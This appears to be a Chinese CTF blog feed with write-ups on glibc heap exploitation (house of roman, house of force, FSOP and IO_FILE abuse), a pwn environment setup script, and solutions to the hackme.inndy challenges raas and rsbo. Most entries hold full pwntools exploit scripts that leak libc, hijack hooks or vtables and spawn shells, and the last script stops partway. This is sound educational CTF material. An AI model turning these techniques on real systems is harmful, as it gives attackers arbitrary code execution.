p64(0x21) +'a'*16+ p64(0)+ p64(0xf80)upgrade(len(payload),payload,123,2)build(0x1000,'b',123,1)log.info('-----------------------leak address-------------------------')build(0x400,'a'*8,123,1)see()p.recvuntil("a"*8)leak = u64(p.recv(6).ljust(8,'\x00'))libc_base = leak -1640- 0x3c4b20 print "libc base address --&gt;[%s]"%hex(libc_base)upgrade(0x400,'a'*16,123,1)see()p.recvuntil('a'*16)leak_heap = u64(p.recv(6).ljust(8,'\x00'))heap_base = leak_heap - 0xe0print "leak_heap --&gt;[%s]"%hex(leak_heap)print "heap_base --&gt;[%s]"%hex(heap_base)_IO_list_all = libc.symbols['_IO_list_all'] + libc_basesystem = libc.symbols['system'] + libc_baselog.info('-------------------------unsorted bin and build fake file--------------------------')payload = 'a'*0x400payload += p64(0) + p64(0x21) + 'a'*0x10fake_file = '/bin/sh\x00' + p64(0x60) #这里写入binsh字符串是因为最后调用vtable中的函数时会将IO_FILE的指针作为参数fake_file += p64(0) + p64(_IO_list_all - 0x10)#unsorted bin attackfake_file += p64(0) + p64(1) #bypass check fake_file = fake_file.ljust(0xc0,'\x00')payload += fake_filepayload += p64(0)*3payload += p64(heap_base + 0x5e8)#vtablepayload += p64(0)*2payload += p64(system)upgrade(0x800,payload,123,1)p.recv()p.sendline('1')p.interactive()]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[house_of_roman]]></title>
    <url>%2F2018%2F09%2F18%2F2018-9-18-house_of_roman%2F</url>
    <content type="text"><![CDATA[记录一下，防止以后忘了 house_of_roman：该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用 house_of_roman的作者提供了一个demo作为展示利用大概分三个步骤： 将 FD 指向 malloc_hook 修正 0x71 的 Freelist 往 malloc_hook 写入 one gadget 先分析下程序：程序开启了PIE和NX，一共有3个功能 程序存在UAF漏洞和堆溢出漏洞 堆溢出： UAF： 程序的大致情况了解了后，分析作者的利用过程我将作者的利用过程又细分了下 先分配3个chunk(0,1,2),大小分别为0x20,0xd0,0x70 用write_chunk功能在chunk2 + 0x68上设置fakesize 为0x61，用于后面的fastbins attack 将chunk1 free 掉后再分配，使得chunk1中包含main_arean+0x88的指针 然后分配3个大小为0x70的chunk(3,4,5),为后面做准备 通过堆溢出漏洞，将chunk1的size字段伪造为0x71，然后将chunk2,chunk3 free掉，通过UAF漏洞，将chunk3的fd指针最低位修改成0x20，将chunk1加入fastbins list中 将chunk1的fd修改成 malloc_hook-0x23,之所以修改成malloc_hook-0x23 ，是为了后面的fastbin dup， __malloc_hook - 0x23 + 0x8的地址上的值为0x7f 连续分配3个大小为0x70的chunk，就可以获得包含__malloc_hook的chunk，将这个chunk指针赋给chunk0 free掉chunk4,通过uaf，将chunk4的FD修改为0，修复fastbins list 利用unsorted bins attack 向__malloc_hook写入main_arena+0x88 通过编辑功能，将__malloc_hook的低三个字节修改成one_gadget的偏移 最后连续free chunk5两次，通过malloc_printerr来出发malloc，getshell 为了方便调试，我关掉了aslr 设置fake_size123fake = "A"*0x68fake += p64(0x61) ## fake sizeedit(1,fake) free chunk1，使其包含main_arena+0x88的地址 *分配3个大小为0x70的chunk,修改chunk1的size字段为0x711234567create(0x65,3) # chunk3 0x555555757170create(0x65,15) # chunk4 0x5555557571e0create(0x65,18) # chunk5 0x555555757250over = "A"*0x18 # off by oneover += "\x71" # set chunk 1's size --&gt; 0x71edit(0,over) free掉chunk2，chunk3，通过uaf将chunk3的fd最低为修改为’\x20’，将chunk1加入fastbins list中1234delete(2)delete(3)heap_po = "\x20"edit(3,heap_po) 利用write功能，将chunk1的fd指针最低两位修改成’\xed\x1a’,即将fd修改为malloc_hook - 0x23，这是为了利用fastbins dup 获得包含malloc_hook的chunk， 原因上面说了，因为__malloc_hook - 0x23 +0x8地址的值为0x7f，可以绕过检测12malloc_hook_nearly = "\xed\x1a" #__malloc_hook - 0x23 edit(1,malloc_hook_nearly) 连续分配三次大小为0x70的chunk，就可以获得包含__malloc_hook的chunk了 利用 unsorted bin attack 向malloc_hook中写入main_arena+0x88，使malloc_hook中包含libc的地址12345678910create(0xc8,1)create(0xc8,1)create(0x18,2)create(0xc8,3)create(0xc8,4)delete(1)po = "B"*8po += "\x00\x1b" # 这个是__memalign_hook的最低两位，为了将bk修改为__malloc_hook - 0x10edit(1,po)create(0xc8,1) 通过修改chunk0，将__malloc_hook的低三位修改为one_gadget123over = &quot;R&quot;*0x13 # padding for malloc_hookover += &quot;\xa4\xd2\xaf&quot;edit(0,over) 此时 malloc_hook附近的内容为下图，padding的计算是分配包含malloc_hook的chunk的地址 减去 __malloc_hook的地址 最后通过连续free同一块chunk，通过malloc_printerr 来触发malloc getshell exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import*#context.log_level = 'debug'p = process('./new_chall')def create(size,idx): p.recv() p.sendline('1') p.recv() p.sendline(str(size)) p.recv() p.sendline(str(idx))def edit(idx,content): p.recv() p.sendline('2') p.recv() p.sendline(str(idx)) p.recv() p.send(content)def delete(idx): p.recv() p.sendline('3') p.recv() p.sendline(str(idx))p.recvuntil(":")p.sendline("zs0zrc")create(0x18,0) # chunk0 0x20create(0xc8,1) # chunk1 d0 0x555555757030 create(0x65,2) # chunk2 0x70 0x555555757100fake = "A"*0x68fake += p64(0x61) ## fake sizeedit(1,fake)log.info('edit chunk 1 to fake')delete(1)create(0xc8,1)create(0x65,3) # chunk3 0x555555757170create(0x65,15) # chunk4 0x5555557571e0create(0x65,18) # chunk5 0x555555757250over = "A"*0x18 # off by oneover += "\x71" # set chunk 1's size --&gt; 0x71edit(0,over)log.info('set chunk 1 size --&gt; 0x71')delete(2)delete(3)heap_po = "\x20"edit(3,heap_po)log.info('ADD b to fastbins list')# malloc_hook--&gt;[0x7ffff7dd1b10]malloc_hook_nearly = "\xed\x1a" #__malloc_hook - 0x23 edit(1,malloc_hook_nearly)log.info("change B fd ")create(0x65,0)create(0x65,0)create(0x65,0) #malloc a chunk include malloc_hookdelete(15)edit(15,p64(0))#fix fastbins listlog.info('fix fastbins list')create(0xc8,1)create(0xc8,1)create(0x18,2)create(0xc8,3)create(0xc8,4)delete(1)po = "B"*8po += "\x00\x1b"edit(1,po)create(0xc8,1)log.info('use unsortbins attack change malloc_hook to main_arena + 0x88')over = "R"*0x13 # padding for malloc_hookover += "\xa4\xd2\xaf"edit(0,over)delete(18)delete(18)p.interactive()]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IO_FILE的利用总结]]></title>
    <url>%2F2018%2F09%2F17%2F2018-9-17-IO_FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[fclose 劫持fp指针,伪造_IO_FILE_plus结构 伪造IO_FILE_plus结构体, 32位和64位不一样，32位的需要伪造vtable,而64位可以不用伪造vtable，因为64位的在绕过几个函数后会获得一次call [rax + 0x10]的机会 先说32bits的 调用 IO_FINISH(fp)的情况 123456789101112#注意flags字段，只需要_flags &amp; 0x2000为0就会直接调用 IO_FINSH(fp)，IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp)#其中shell是后门函数fake_file = "\x00" * 0x48 + p32(buf_add)fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(buf_add + 0x98 - 0x8)#fake_vtable_addr = buf_addr + 0x98 - 0x8fake_file += p32(shell)#不存在后门函数的情况fake_file = "\x00" * 4 + ";sh" fake_file = fake_file.ljust(0x48,'\x00')+ p32(buf_add)fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(buf_add + 0x98 - 0x8)#fake_vtable_addr = buf_addr + 0x98 - 0x8fake_file += p32(system) 调用__fclose()函数的情况: flags &amp; 0x2000不为0 1234567#_flags &amp; 0x2000不为0最终会调用fp-&gt;vtabl-&gt;__fclose(fp)fake_file = "/bin/sh\x00"fake_file = fake_file.ljust(0x48,'\x00')fake_file += p32(fake_lock_addr) # 指向一处值为0的地址fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(fake_vtable)#fake vtable address = buf_addr + 0x98 - 0x44fake_file += p32(system) 64bits的情况： 程序中存在后门函数 12fake_file ='\0'*0x10 + p64(get_shell)+'\0'*0x70+ p64(buf_addr)fake_file = fake_file.ljust(0xd8,'\0')+p64(buf_addr) 程序中不存在后门函数 123456fake_file = "/bin/sh\x00" + '\x00' * 0x8fake_file += p64(system) + '\x00' * 0x70# the system can also be placed in other memoryfake_file += p64(fake_lock_addr)#指向一处值为0的地址fake_file = fake_file.ljust(0xd8, '\x00')fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr fclose源码学习文章：blog 等过段时间有时间了在去分析下fclose源码 例子 ： xman 的example1 可以编译成32位和64位来练练手 ，pwnable.tw的seethefile 劫持 stdout文件流指针 通过任意地址写漏洞，将stdout的指针指向伪造的_IO_FILE_plus结构,其中vtable指向伪造的 vtable函数表 这里拿 网鼎杯的那道blind做例子 原本的stdout结构体 1234567891011121314151617181920212223242526272829303132333435gef➤ p *(struct _IO_FILE_plus *) stdout$2 = &#123; file = &#123; _flags = 0xfbad2887, _IO_read_ptr = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_read_end = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_read_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_ptr = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_end = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_end = 0x7f5b6742a6a4 &lt;_IO_2_1_stdout_+132&gt; "", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7f5b674298e0 &lt;_IO_2_1_stdin_&gt;, _fileno = 0x1, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = "\n", _lock = 0x7f5b6742b780 &lt;_IO_stdfile_1_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7f5b674297a0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x7f5b674286e0 &lt;_IO_file_jumps&gt;&#125; 伪造的IO_FILE_plus结构体中的flags要满足下面的条件 12flag&amp;8 = 0 and flag &amp;2 =0 and flag &amp; 0x8000 != 0所以flag的值可以为0xfbad8000 或者0xfbad8080 其他的根据原本的结构体伪造就行了 123456fake_struct = p64(0x00000000fbad8000) + p64(0x602060)*7 + p64(0x602061) + p64(0)*4 fake_struct += p64(0x602060) + p64(0x1) + p64(0xffffffffffffffff)+ p64(0) fake_struct += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) fake_struct += p64(0)*3 + p64(0x00000000ffffffff) + p64(0) fake_struct += p64(0)+ p64(0x602090 + 0x68*3)fake_vtable = p64(system_addr)*10 + '\n' 伪造后的结构体: 1234567891011121314151617181920212223242526272829303132333435gef➤ p *(struct _IO_FILE_plus *)0x602090$1 = &#123; file = &#123; _flags = 0xfbad8000, _IO_read_ptr = 0x602060 " `", _IO_read_end = 0x602060 " `", _IO_read_base = 0x602060 " `", _IO_write_base = 0x602060 " `", _IO_write_ptr = 0x602060 " `", _IO_write_end = 0x602060 " `", _IO_buf_base = 0x602060 " `", _IO_buf_end = 0x602061 " `", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x602060, _fileno = 0x1, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = "", _lock = 0x602060, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x602060, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x6021c8&#125; FSOP 这个技术的核心就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的IO_overflow函数。 libc版本小于2.24 IO_flush_all_lockp函数源码 123456789101112131415161718192021222324252627282930_IO_flush_all_lockp (int do_lock)&#123; int result = 0; FILE *fp;#ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock);#endif for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/ || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/ ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; &#125;#ifdef _IO_MTSAFE_IO _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0);#endif return result;&#125; IO_flush_all_lockp函数触发条件： 当libc执行abort流程时 abort可以通过触发malloc_printerr来触发 当执行exit函数时 当执行流从main函数返回时 FSOP攻击的前提条件： 泄露出libc地址，知道 _IO_lsit_all的地址 任意地址写的能力，修改 _IO_list_all为可控的地址 可以在可控内存中伪造_IO_FILE_plus结构 _IO_list_all 结构： 1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p *_IO_list_all$1 = &#123; file = &#123; _flags = 0xfbad2086, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;, #这里是我们需要控制的地方，将伪造的_IO_FILE_plus结构链入 _IO_FILE的链表头部 _fileno = 0x2, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = "", _lock = 0x7ffff7dd3770 &lt;_IO_stdfile_2_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dd1660 &lt;_IO_wide_data_2&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125; 伪造的_IO_FILE_plus结构体要绕过的check 12345671.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是2._IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 一般来说都是伪造前者，因为简单点 具体利用 可以去看 house of orange这道题 新版本libc下的IO_FILE的利用 通过控制 stdin/stdout文件流 内部的_IO_buf_base和 _IO_buf_end来达到任意地址读写的目的 因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过scanf\printf一样可以进行利用 _IO_FILE结构 1234567891011121314151617181920212223242526272829struct _IO_FILE&#123; int _flags; /*flag标志位，用于一些检查 */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* 操作的起始地址. */ char *_IO_buf_end; /* 操作的结束地址. */ /*控制 _IO_buf_base 和 _IO_buf_end就可以实现任意读写*/ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; /* 用于形成_IO_FILE 链表 int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it's too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 任意地址读的例子 from Angelboy大佬 任意地址写的例子 from Angelboy大佬]]></content>
      <categories>
        <category>IO_FILE利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn环境]]></title>
    <url>%2F2018%2F09%2F16%2F2018-9-16-pwnenv%2F</url>
    <content type="text"><![CDATA[记录一下我的pwn环境，为以后虚拟机玩坏了要重装做准备先装一手虚拟机，下好ubuntu16.0.4版本的镜像装好镜像地址：https://pan.baidu.com/s/1mhCxGKg 密码：skyf 虚拟机装好后就开始装下面这些东西 32位依赖库 gdb的插件 peda 用来调试堆的插件Pwndbg ROPgadget 做题的工具，用来找gadget的 pwntools 是一个ctf框架和漏洞利用开发库，用python开发的 LibcSearcher用来泄露libc库中函数的偏移的库 one_gadget用来寻找libc库中的execve(‘/bin/sh’, NULL, NULL)可以一个gadget就可以getshell的好东西 安装32位程序运行依赖环境：12dpkg --add-architecture i386sudo apt-get -y install lib32z1 lib32ncurses5 安装peda：12git clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit 安装Pwndbg:123cd ~/git clone https://github.com/scwuaptx/Pwngdb.git cp ~/Pwngdb/.gdbinit ~/ ROPgadget:123456先安装Capstone Capstone是一个轻量级的多平台架构支持的反汇编架构，支持包括ARM\ARM64、MIPC和x64/x86平台。sudo apt-get install python-capstone然后，下载好ROPgadget解压进入文件夹中python setup.py install$ ROPgadget pwntools安装 :1234567最新版的pwntools会报错 在安装完后再加一条 sudo pip install pyelftools==0.24 就可以了sudo apt-get updatesudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialsudo pip install --upgrade pipsudo pip install --upgrade pwntools#可能安装时会遇到很多奇奇怪怪的问题，上网查基本上都可以查得到，要学会科学上网 LibcSearcher安装：1234git clone https://github.com/lieanu/libc.gitcd libcgit submodule update --init --recursivesudo python setup.py develop one_gadget安装：1234先安装gemsudo apt install ruby然后gem install one_gadget 然后还要在windows上装好IDA，这是一款很强大的静态反编译软件(F5大法好，了解一下)可以在52pojie上下，下面贴上网址https://www.52pojie.cn/thread-675251-1-1.html 还有半自动化脚本 1234567891011121314151617181920212223242526272829303132333435363738#!/bin/bashcd ~/# change soursesudo sed -i 's/# deb-src/deb-src/' "/etc/apt/sources.list"# support 32 bitdpkg --add-architecture i386sudo apt-get updatesudo apt-get -y install lib32z1 lib32ncurses5# download the libc source to current directorysudo apt-get source libc6-dev#install vimsudo apt install vim#install gitsudo apt-get -y install git# install pedagit clone https://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit# install pwndbggit clone https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.sh#install gem and one_gadgetsudo apt install rubysudo gem install one_gadget# install pwntoolssudo apt-get -y install python python-pipsudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialsudo pip install --upgrade pipsudo pip install pwntoolssudo pip install pyelftools==0.24echo "ok have fun with pwn!!"]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[top_chunk的玩法]]></title>
    <url>%2F2018%2F09%2F15%2F2018-9-15-topchunk%E7%9A%84%E4%B8%80%E4%BA%9B%E7%8E%A9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[house_of_force是一种通过修改topchunk 的size字段来控制malloc返回包含想要控制地址的chunk的手法，从而达到修改任意地址内容的目的 原理：123456假设有一个溢出漏洞，可以改写 top chunk 的size字段，然后将其改为一个非常大的值，以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果攻击者 malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大数，造成整数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的 .bss 段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移之后地址处的内存。 house_of_force利用条件： 存在漏洞能控制top_chunk的size大小 能自由控制分配堆的大小 分配的次数不受限制 evil chunk的大小：用目标地址减去 top chunk 地址，再减去 chunk 头的大小。 利用方法： 通过漏洞控制top chunk 的size字段为-1 (32位的话就是0xffffffff,64位的话就是0xffffffffffffffff) 计算出要分配的evil chunk的大小 分配evil chunk 分配目标地址的chunk 同时top_chunk还有另一种玩法假设存在堆溢出漏洞或者其他能修改top chunk size字段的漏洞，加上malloc的大小受用户输入控制 将top chunk size 字段修改为 __free_hook + system - top_chunk _ptr -1 在malloc 一个 _free_hook - top_chunk_ptr - 0x10大小的chunk就可以将__free_hook 地址的内容修改为 top chunk的新size 即 system函数的地址 具体分析下源码： 从topchunk中分配chunk的操作12345678910111213p = av-&gt;top;size = chunksize (p);/* check that one of the above allocation paths succeeded */if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (p, nb); av-&gt;top = remainder; set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, p, nb); return chunk2mem (p); &#125; 如果将top chunk的size字段修改为(system + free_hook - top_chunk_ptr )当分配 free_hook - top_chunk_ptr -0x10时，就会从top chunk 中分配分配完后 ，新topchunk 的size 为1new_size= (system + __free_hook - top_chunk_ptr) - (__free_hook - top_chunk_ptr - 0x10 + 0x10) = system 然后新的top_chunk_ptr 为 old_top_ptr + 分配掉的size1new_top_chunk_ptr = top_ptr + ( __free_hook - top_chunk_ptr -0x10) = __free_hook - 0x10 理论上是这样的，但是实际分配的时候还需要考虑到计算size的对齐问题等，所以可以在上面写入的值附近试一试，保证最后可以在__free_hook写入system地址（实际上是system+1，因为topchunk的P标志位会被设为1）地址就行。]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[raas writeup]]></title>
    <url>%2F2018%2F05%2F11%2F2018-5-11-raas-writeup%2F</url>
    <content type="text"><![CDATA[hint:This is a Record-as-a-Service!And also our fist heap-based challenge.Tips: use after free同时题目给了源码很明显这是一个UAF漏洞的利用 防护机制： 题目的数据结构：12345678struct record &#123; void (*print)(struct record *); void (*free)(struct record *); union &#123; int integer; char *string; &#125;;&#125;; 题目用来free的函数123456789101112131415161718void rec_int_free(struct record *rec)&#123; free(rec); puts("Record freed!");&#125;void rec_str_free(struct record *rec)&#123; free(rec-&gt;string); free(rec); puts("Record freed!");&#125;void do_dump()&#123; int idx = ask("Index"); records[idx]-&gt;print(records[idx]);&#125; 因为它free后没有将堆块中的指针清零，同时也没将数组的内容清空，所以这里存在UAF漏洞，这堆块在free掉后还可以使用 生成两个int的record,查看下堆的情况12createint(0,&quot;123&quot;) /*假设分配的堆块为p1*/createint(1,&quot;123&quot;) /*假设分配的堆块为p2*/ 画个直观图就是下面这样： 将这两个record free掉后，堆的情况 可以看见int类型的record的大小为0x10，chunk_size后面存放了free函数的指针和print函数的指针它们free掉后，根据它们的大小，它们被分到fastbin，根据fastbin的分配规则，后free的chunk块会被先分配。如果这个时候create一个字符型的record[2]，控制字符串大小小于16，那么会将p2分配给record[2]，将p1分配给字符串。1createstr(2,12,&quot;aaaabbbb&quot;) 堆的情况： 可以看到此时p1上的指针已经被”aaaabbbb”给覆盖了 如果将p1的free函数的指针覆盖成system函数，字符串以”sh\x00\x00”开头，再调用do_delete(0),就可以控制程序执行system函数，最终获取shell 解题思路： 先create 两个int的record,然后delete掉它们 然后生成一个字符型的record,字符串的大小为12，以”sh\x00\x00”开头 调用do_delete(0) exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python# coding=utf-8from pwn import*context.log_level = "debug"p = process('./raas')system = 0x080484F0def createint(index,content): p.recvuntil("&gt;") p.sendline(str(1)) p.recvuntil("&gt;") p.sendline(str(index)) p.recvuntil("&gt;") p.sendline("1") p.recvuntil("&gt;") p.sendline(content)def createstr(index,size,content): p.recvuntil("&gt;") p.sendline(str(1)) p.recvuntil("&gt;") p.sendline(str(index)) p.recvuntil("&gt;") p.sendline("2") p.recvuntil("&gt;") p.sendline(str(size)) p.recvuntil("&gt;") p.sendline(content)def delete(index): p.recvuntil("&gt;") p.sendline(str(2)) p.recvuntil("&gt;") p.sendline(str(index))createint(0,"123")createint(1,"456")delete(0)delete(1)payload = "sh\x00\x00" + p32(system) createstr(2,12,payload)delete(0)gdb.attach(p)pause() p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rsbo-1 和 rsbo-2 writeup]]></title>
    <url>%2F2018%2F05%2F11%2F2018-5-11-rsbo-1-%E5%92%8C-rsbo-2-writeup%2F</url>
    <content type="text"><![CDATA[这两道题的文件是一样的，不过一个没要求getshell，一个要求getshll rsbo-1防护机制:只开启了堆栈不可执行题目hint: ROP, open, read很明显要要用ROP调用执行open()函数打开flag文件 然后用read()函数读取文件ida反编译代码** 它先执行init函数 ，打开“/home/ctf/flag”文件，然后读到buf上，再用随机数将buf的内容破坏，最后用memset将buf的内容清零。然后执行read_80_bytes()函数，这里存在溢出点，具体需要填充的字节为108，这个函数读取0x80个字节的内容到v5上，然后将返回值赋给v8,接下来的一个for循环会将会随机破坏内存中的数据，最后调用write()函数输出v5的内容 解题思路： 利用open()函数打开flag文件 利用read()函数将flag读到bss段 利用write()函数将flag打印出来 payload的构造填充的字符要用”\x00”,我看大佬的博客说好像是为了使v8的值为0，绕过循环 exp： 123456789101112131415161718192021222324252627#!/usr/bin/env python# coding=utf-8from pwn import *context.log_level="debug"p = process('./rsbo-1')#p = remote('hackme.inndy.tw', 7706)elf = ELF('./rsbo-1')start = 0x08048490open_plt = elf.symbols['open']read_plt = elf.symbols['read']write_plt = elf.symbols['write']log.info("open_plt --&gt;[%s]"%hex(open_plt))log.info("read_plt --&gt;[%s]"%hex(read_plt))log.info("read_plt --&gt;[%s]"%hex(write_plt))bss = elf.bss()offset = 108flag_add = 0x80487d0payload = '\x00'*offset + p32(open_plt) + p32(start) + p32(flag_add) + p32(0) p.send(payload)payload1 = '\x00'*offset + p32(read_plt) + p32(start) + p32(0x3) + p32(bss) + p32(0x60)p.send(payload1)payload2 = '\x00'*offset + p32(write_plt) +p32(0xdeadbeef) + p32(1) + p32(bss) + p32(0x60)p.send(payload2)p.interactive() rsbo2hint:Get shell please. Tips: stack migration 它要求我们获取目标主机的shell,同时还给了 migration的提示因为可供我们控制的溢出字节为20 不足以构造出我们getshell的rop链所以要将stack迁移到我们能控制的地方去 这题可以用泄露libc内存的做法来做也可以用_dl_runtime_resolve的做法我用的是_dl_runtime_resolve的做法，最近才学会，就想多练下 栈迁移用到的gadget是 pop_ebp 和 leave_ret这里栈迁移的地址不能是bss段的开头 很神奇，我也不知道为什么会这样我选的地址是bss+0x400 解题思路： migrate stack to bss + 0x400 构造调用read函数和_dl_runtime_resolve函数的rop链 在内存中写入_dl_runtime_resolve函数需要用到的参数 migrate stack 1payload = '\x00'*108 + p32(read_80_byte) + p32(pop_ebp) + p32(bss + 0x400) + p32(leave_ret) built rop chain 123payload = 'a'*4 + p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100)payload += rop.dl_resolve_call(base_stage+20,base_stage)payload += rop.fill(0x80,payload) write argument in base_stage 1234payload = rop.string('/bin/sh\x00')payload += rop.fill(20,payload)payload += rop.dl_resolve_data(base_stage + 20,'system')payload += rop.fill(100,payload) exp:12345678910111213141516171819202122232425262728293031323334from pwn import*import pwnlibimport roputilscontext.log_level = "debug"p = remote('hackme.inndy.tw', 7706)#p = process('./rsbo-1')elf = ELF('./rsbo-1')rop = roputils.ROP('./rsbo-1')offset = 108bss = elf.bss()base_stage = bss + 0x800print hex(base_stage)pop_ebp = 0x0804879fleave_ret = 0x080484f8pop3_ret = 0x0804879dstart = 0x0804867Fread_plt = 